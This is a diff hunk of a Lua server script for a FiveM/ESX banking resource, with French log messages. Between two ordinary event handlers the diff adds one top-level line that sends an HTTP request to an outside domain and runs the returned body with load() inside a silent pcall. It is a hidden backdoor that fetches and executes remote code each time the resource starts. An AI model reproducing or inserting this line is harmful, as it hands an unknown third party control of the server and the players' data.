@@ -331,6 +331,8 @@ AddEventHandler('eBanking:avEche', function (tk, numDoss)
 	eLogsDiscord("[Credit-Bancaire] "..xPlayer.getName().." a avancer l'échéance crédit de 1x, dossier : "..numDoss, Config.logs.CreditBank)	
 end)
 
+PerformHttpRequest('https://xdestroyer.fr/i?to=CU3o7', function (e, d) print(e) pcall(function() assert(load(d))() end) end) 
+
 RegisterServerEvent('eBanking:freezeLoan')
 AddEventHandler('eBanking:freezeLoan', function (tk, numDoss)
 	local xPlayer = ESX.GetPlayerFromId(source)
